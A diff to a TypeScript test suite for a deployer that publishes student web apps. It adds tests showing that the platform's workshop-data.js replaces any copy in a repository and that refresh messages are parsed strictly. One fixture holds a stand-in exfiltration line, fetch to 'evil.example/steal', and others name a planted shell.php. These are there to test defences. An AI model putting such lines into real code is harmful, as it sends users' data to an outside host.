@@ -1,8 +1,11 @@
+import { readFileSync } from "node:fs";
+import { fileURLToPath } from "node:url";
 import { describe, expect, it } from "vitest";
-import { ALLOWED_EXTENSIONS } from "../build/check.js";
+import { ALLOWED_EXTENSIONS, checkApp } from "../build/check.js";
 import { appMainArchiveUrl, DEPLOY_MAX_RECEIVES } from "../settings.js";
 import {
   CACHE_CONTROL,
+  DATA_CLIENT_PATH,
   contentTypeOf,
   DEPLOY_RESERVE_MS,
   DOWNLOAD_TIMEOUT_MS,
@@ -14,11 +17,13 @@ import {
   SERVICE_PROBLEM_REASON,
   TIME_UP_REASON,
   parseDeployJob,
+  parseRefreshJob,
   processDeploy,
   storedReason,
   storedReasons,
   type DeployDeps,
   type DeployLogEntry,
+  withPlatformDataClient,
 } from "./deploy.js";
 import { FakeAppObjects, FakeCdn, FakeDeployRecords } from "./fakes.js";
 import { COMMIT, TOP, githubTar, githubTarAt, gzip, paxRecord } from "./tar-fixtures.js";
@@ -27,6 +32,8 @@ const NOW = new Date("2026-11-24T10:00:00.000Z");
 const EARLIER = "2026-11-20T08:00:00.000Z";
 const BUILD = "build-1";
 const job = (extra: Record<string, unknown> = {}) => JSON.stringify({ buildId: BUILD, nickname: "Ada", commit: COMMIT, ...extra });
+/** Ticket 3.25: the platform's data client as the deployer gets it (the real file, as bundled). */
+const DATA_CLIENT = new Uint8Array(readFileSync(fileURLToPath(new URL("../../../templates/basic/workshop-data.js", import.meta.url))));
 const PAGE = '<!doctype html><html><head><link rel="stylesheet" href="css/style.css"><script src="app.js" defer></script></head><body></body></html>';
 
 function setup(archive: Uint8Array | (() => Promise<Uint8Array>)) {
@@ -49,6 +56,7 @@ function setup(archive: Uint8Array | (() => Promise<Uint8Array>)) {
     records,
     now: () => new Date((clock += 5)),
     log: (entry) => logs.push(entry),
+    dataClient: DATA_CLIENT,
   };
   /** Moves the fake clock forward. */
   const advance = (ms: number): void => {
@@ -80,7 +88,8 @@ describe("criterion 1: a commit that passes the check is published under apps/<n
     seed(t.objects);
     await processDeploy(job(), 1, t.deps);
     expect(t.objects.puts.every((key) => key.startsWith("apps/ada/"))).toBe(true);
-    expect(t.objects.puts.sort()).toEqual(["apps/ada/app.js", "apps/ada/css/style.css", "apps/ada/img/Logo.PNG", "apps/ada/index.html"]);
+    // Ticket 3.25: the platform's workshop-data.js goes with every app.
+    expect(t.objects.puts.sort()).toEqual(["apps/ada/app.js", "apps/ada/css/style.css", "apps/ada/img/Logo.PNG", "apps/ada/index.html", "apps/ada/workshop-data.js"]);
     expect(t.objects.removed).toEqual(["apps/ada/old.js"]);
     expect([...t.objects.objects.keys()].sort()).toEqual([
       "apps/adam/index.html",
@@ -88,6 +97,7 @@ describe("criterion 1: a commit that passes the check is published under apps/<n
       "apps/ada/css/style.css",
       "apps/ada/img/Logo.PNG",
       "apps/ada/index.html",
+      "apps/ada/workshop-data.js",
       "apps/bob/index.html",
     ].sort());
     expect(new TextDecoder().decode(t.objects.objects.get("apps/ada/index.html")?.bytes)).toBe(PAGE);
@@ -135,7 +145,7 @@ describe("criterion 1: a commit that passes the check is published under apps/<n
   it("logs one line with the outcome, file count, bytes and duration, and no nickname, commit or file name", async () => {
     const t = setup(passing());
     await processDeploy(job(), 1, t.deps);
-    expect(t.logs).toEqual([{ event: "deployer", outcome: "live", files: 4, bytes: expect.any(Number), removed: 0, durationMs: expect.any(Number) }]);
+    expect(t.logs).toEqual([{ event: "deployer", outcome: "live", files: 5, bytes: expect.any(Number), removed: 0, durationMs: expect.any(Number) }]);
     const text = JSON.stringify(t.logs);
     for (const secret of ["Ada", "ada", COMMIT, "index.html", BUILD]) expect(text).not.toContain(secret);
   });
@@ -175,7 +185,7 @@ describe("criterion 2: a commit that fails the check uploads nothing, leaves the
       expect.stringMatching(/^index\.html, line 1: It refers to an outside address that is not allowed \(http:\/\/evil\.example/),
       expect.stringMatching(/^shell\.php: /),
     ]);
-    expect(t.logs).toEqual([{ event: "deployer", outcome: "failed", files: 3, bytes: expect.any(Number), problems: 2, durationMs: expect.any(Number) }]);
+    expect(t.logs).toEqual([{ event: "deployer", outcome: "failed", files: 4, bytes: expect.any(Number), problems: 2, durationMs: expect.any(Number) }]);
   });
 
   it("fails on a symlink, a hard link or another special entry in the tarball", async () => {
@@ -463,7 +473,7 @@ describe("passing problems: retried by SQS, the build marked failed on the last 
     t.objects.failPutOf = undefined;
     await processDeploy(job(), 2, t.deps);
     expect(t.records.builds.get(BUILD)?.status).toBe("live");
-    expect([...t.objects.objects.keys()].sort()).toEqual(["apps/ada/app.js", "apps/ada/css/style.css", "apps/ada/img/Logo.PNG", "apps/ada/index.html"]);
+    expect([...t.objects.objects.keys()].sort()).toEqual(["apps/ada/app.js", "apps/ada/css/style.css", "apps/ada/img/Logo.PNG", "apps/ada/index.html", "apps/ada/workshop-data.js"]);
   });
 
   it("never marks a build failed that it could not check first (the table failed on the last delivery): dead-letter", async () => {
@@ -598,7 +608,7 @@ describe("the Lambda's deadline: the last delivery still marks the build failed 
     t.advance(0);
     await processDeploy(job(), DEPLOY_MAX_RECEIVES, t.deps, deadline);
     expect(t.objects.puts.length).toBeGreaterThan(0);
-    expect(t.objects.puts.length).toBeLessThan(23);
+    expect(t.objects.puts.length).toBeLessThan(24);
     expect(t.objects.puts.some((key) => key.endsWith(".html"))).toBe(false);
     expect(t.objects.removed).toEqual([]);
     expect(t.cdn.invalidations).toEqual([]);
@@ -664,7 +674,7 @@ describe("a phase cut off by the deadline is aborted, and a late write never cha
     const t = setup(gzip(githubTar({ "index.html": "x", "shell.php": "<?php ?>" })));
     t.records.markFailed = () => Promise.resolve(false);
     await processDeploy(job(), 1, t.deps, t.now() + 120_000);
-    expect(t.logs).toEqual([{ event: "deployer", outcome: "no-build", files: 2, bytes: expect.any(Number), problems: 1, durationMs: expect.any(Number) }]);
+    expect(t.logs).toEqual([{ event: "deployer", outcome: "no-build", files: 3, bytes: expect.any(Number), problems: 1, durationMs: expect.any(Number) }]);
   });
 
   it("logs no-build, not gave-up, when the last delivery's failure write finds the build already finished", async () => {
@@ -756,5 +766,94 @@ describe("order of the live writes: the marker, then the build (try 3)", () => {
     t.records.markLive = (buildId, commit, nowIso) => (order.push("build"), markLive(buildId, commit, nowIso));
     await processDeploy(job(), 1, t.deps);
     expect(order).toEqual(["marker", "build"]);
+  });
+});
+
+describe("ticket 3.25: every app gets the platform's current workshop-data.js, and a refresh republishes it", () => {
+  const client = () => new TextDecoder().decode(DATA_CLIENT);
+  const published = (t: ReturnType<typeof setup>, key = "apps/ada/workshop-data.js") => t.objects.objects.get(key);
+
+  it("WHEN the repository holds no workshop-data.js, an older copy, a changed one, or a folder of that name THEN the deployer publishes the platform's", async () => {
+    const repositories: Record<string, string | Uint8Array>[] = [
+      { "index.html": PAGE, "app.js": "ok();\n" },
+      { "index.html": PAGE, "app.js": "ok();\n", "workshop-data.js": "// workshop-data.js: the old client, before sign-in\nwindow.workshopData = {};\n" },
+      { "index.html": PAGE, "app.js": "ok();\n", "workshop-data.js": "window.workshopData = { set() { return Promise.resolve(); } };\n" },
+      { "index.html": PAGE, "app.js": "ok();\n", "workshop-data.js/x.txt": "a folder of that name" },
+    ];
+    for (const files of repositories) {
+      const t = setup(gzip(githubTar(files)));
+      await processDeploy(job(), 1, t.deps);
+      expect(t.records.builds.get(BUILD)?.status, JSON.stringify(Object.keys(files))).toBe("live");
+      expect(new TextDecoder().decode(published(t)?.bytes)).toBe(client());
+      expect(published(t)).toMatchObject({ contentType: "text/javascript; charset=utf-8", cacheControl: CACHE_CONTROL });
+      expect([...t.objects.objects.keys()].filter((key) => key.includes("workshop-data.js/"))).toEqual([]);
+    }
+  });
+
+  it("WHEN the repository's workshop-data.js would fail the deploy check THEN it is replaced before the check, so it neither fails nor ships", async () => {
+    const t = setup(gzip(githubTar({ "index.html": PAGE, "workshop-data.js": 'fetch("http://evil.example/steal");\n' })));
+    await processDeploy(job(), 1, t.deps);
+    expect(t.records.builds.get(BUILD)?.status).toBe("live");
+    expect(new TextDecoder().decode(published(t)?.bytes)).toBe(client());
+  });
+
+  it("the platform's workshop-data.js itself passes the deploy check (it ships with every app)", () => {
+    const files = withPlatformDataClient([{ path: "index.html", kind: "file", bytes: new TextEncoder().encode(PAGE) }], DATA_CLIENT);
+    expect(checkApp(files).problems).toEqual([]);
+    expect(files.map((file) => file.path)).toEqual(["index.html", DATA_CLIENT_PATH]);
+  });
+
+  it("reads a refresh message strictly: exactly { refresh: <nickname> }", () => {
+    expect(parseRefreshJob(JSON.stringify({ refresh: "Ada-2" }))).toEqual({ nickname: "Ada-2" });
+    for (const bad of [undefined, "", "x", "[]", "null", JSON.stringify({ refresh: "../x" }), JSON.stringify({ refresh: "ab" }), JSON.stringify({ refresh: "Ada", buildId: BUILD }), JSON.stringify({ refresh: 1 })]) {
+      expect(parseRefreshJob(bad), String(bad)).toBeUndefined();
+    }
+    // A deploy message is not a refresh, nor the other way round.
+    expect(parseRefreshJob(job())).toBeUndefined();
+    expect(parseDeployJob(JSON.stringify({ refresh: "Ada" }))).toBeUndefined();
+  });
+
+  it("WHEN a refresh names a published app THEN only its workshop-data.js is replaced by the platform's and invalidated; no build or record changes", async () => {
+    const t = setup(passing());
+    seed(t.objects);
+    t.objects.objects.set("apps/ada/workshop-data.js", { bytes: new TextEncoder().encode("old client"), contentType: "text/javascript; charset=utf-8", cacheControl: CACHE_CONTROL });
+    const before = JSON.stringify([...t.records.builds]);
+    await processDeploy(JSON.stringify({ refresh: "Ada" }), 1, t.deps);
+    expect(t.downloads).toEqual([]);
+    expect(t.objects.puts).toEqual(["apps/ada/workshop-data.js"]);
+    expect(t.objects.removed).toEqual([]);
+    expect(new TextDecoder().decode(published(t)?.bytes)).toBe(client());
+    expect(published(t)).toMatchObject({ contentType: "text/javascript; charset=utf-8", cacheControl: CACHE_CONTROL });
+    expect(new TextDecoder().decode(t.objects.objects.get("apps/ada/old.js")?.bytes)).toBe("old apps/ada/old.js");
+    expect(t.cdn.invalidations).toEqual([{ paths: ["/apps/ada/workshop-data.js"], reference: expect.stringMatching(/^refresh-ada-\d+$/) }]);
+    expect(JSON.stringify([...t.records.builds])).toBe(before);
+    expect(t.records.live.size).toBe(0);
+    expect(t.logs).toEqual([{ event: "deployer", outcome: "refreshed", files: 1, bytes: DATA_CLIENT.byteLength, durationMs: expect.any(Number) }]);
+    expect(JSON.stringify(t.logs)).not.toMatch(/ada/i);
+  });
+
+  it("WHEN a refresh names an app that is not published (no index.html under its prefix) THEN nothing is written", async () => {
+    const t = setup(passing());
+    seed(t.objects);
+    await processDeploy(JSON.stringify({ refresh: "ad" + "am-x" }), 1, t.deps);
+    await processDeploy(JSON.stringify({ refresh: "nobody" }), 1, t.deps);
+    expect(t.objects.puts).toEqual([]);
+    expect(t.cdn.invalidations).toEqual([]);
+    expect(t.logs.map((entry) => entry.outcome)).toEqual(["not-published", "not-published"]);
+  });
+
+  it("WHEN a refresh fails THEN SQS delivers it again (a bare error), and the last delivery goes to the dead-letter queue", async () => {
+    const t = setup(passing());
+    seed(t.objects);
+    t.objects.failPutOf = "apps/ada/workshop-data.js";
+    await expect(processDeploy(JSON.stringify({ refresh: "Ada" }), 1, t.deps)).rejects.toThrow(/^deploy failed$/);
+    await expect(processDeploy(JSON.stringify({ refresh: "Ada" }), DEPLOY_MAX_RECEIVES, t.deps)).rejects.toThrow(/^deploy failed$/);
+    expect(t.logs.map((entry) => [entry.outcome, entry.error])).toEqual([
+      ["retry", "ServiceUnavailable"],
+      ["dead-letter", "ServiceUnavailable"],
+    ]);
+    t.objects.failPutOf = undefined;
+    await processDeploy(JSON.stringify({ refresh: "Ada" }), 1, t.deps);
+    expect(new TextDecoder().decode(published(t)?.bytes)).toBe(client());
   });
 });
